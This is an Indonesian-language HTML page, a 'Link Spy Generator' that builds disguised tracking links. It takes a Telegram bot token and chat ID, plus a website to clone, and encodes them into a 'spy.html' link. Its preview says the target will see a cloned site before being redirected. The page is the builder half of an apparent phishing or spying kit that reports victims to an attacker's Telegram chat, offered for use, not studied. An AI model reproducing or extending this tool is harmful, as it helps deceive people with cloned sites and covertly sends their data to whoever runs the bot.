<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        h1 {
            text-align: center;
            margin-bottom: 20px;
            color: #4cc9f0;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.9);
            font-size: 16px;
        }
        
        .btn {
            background: linear-gradient(90deg, #4361ee, #3a0ca3);
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            margin: 10px 0;
            transition: all 0.3s;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
        }
        
        .result {
            margin-top: 20px;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            display: none;
        }
        
        .generated-link {
            word-break: break-all;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
        }
        
        .copy-btn {
            background: #27ae60;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        
        .preview {
            margin-top: 15px;
            padding: 10px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ”— Link Spy Generator</h1>
        
        <div class="form-group">
            <label>Bot Token:</label>
            <input type="text" id="botToken" placeholder="Masukkan token bot Telegram">
        </div>
        
        <div class="form-group">
            <label>Chat ID:</label>
            <input type="text" id="chatId" placeholder="Masukkan Chat ID">
        </div>
        
        <div class="form-group">
            <label>URL Target (Website Asli):</label>
            <input type="text" id="targetUrl" placeholder="Contoh: https://google.com" value="https://google.com">
        </div>
        
        <div class="form-group">
            <label>Nama Website (Untuk Clone):</label>
            <input type="text" id="siteName" placeholder="Contoh: Google" value="Google">
        </div>
        
        <button class="btn" id="generateBtn">Generate Link Spy</button>
        
        <div class="result" id="result">
            <h3>Link Spy Berhasil Dibuat:</h3>
            <div class="generated-link" id="generatedLink"></div>
            
            <div class="preview">
                <strong>Preview:</strong><br>
                Target akan melihat clone website <span id="previewSiteName">Google</span><br>
                Lalu redirect ke: <span id="previewTargetUrl">https://google.com</span>
            </div>
            
            <button class="copy-btn" id="copyBtn">Salin Link Spy</button>
        </div>
        
        <button class="btn" style="background: #6c757d;" id="keluarBtn">Keluar</button>
    </div>

    <script>
        document.getElementById('generateBtn').addEventListener('click', function() {
            const botToken = document.getElementById('botToken').value;
            const chatId = document.getElementById('chatId').value;
            const targetUrl = document.getElementById('targetUrl').value;
            const siteName = document.getElementById('siteName').value;
            
            if (!botToken || !chatId || !targetUrl) {
                alert('Isi semua field terlebih dahulu!');
                return;
            }
            
            // Encode data
            const data = {
                token: botToken,
                chatId: chatId,
                target: targetUrl,
                siteName: siteName
            };
            
            const encodedData = btoa(JSON.stringify(data));
            
            // Generate link spy
            const currentUrl = window.location.href;
            const baseUrl = currentUrl.substring(0, currentUrl.lastIndexOf('/') + 1);
            const spyUrl = baseUrl + 'spy.html?data=' + encodedData;
            
            // Tampilkan hasil
            document.getElementById('generatedLink').textContent = spyUrl;
            document.getElementById('previewSiteName').textContent = siteName;
            document.getElementById('previewTargetUrl').textContent = targetUrl;
            document.getElementById('result').style.display = 'block';
        });
        
        document.getElementById('copyBtn').addEventListener('click', function() {
            const linkText = document.getElementById('generatedLink').textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                alert('Link spy berhasil disalin!');
            });
        });
        
        document.getElementById('keluarBtn').addEventListener('click', function() {
            if (confirm('Yakin ingin keluar?')) {
                window.close();
            }
        });
    </script>
</body>
</html>
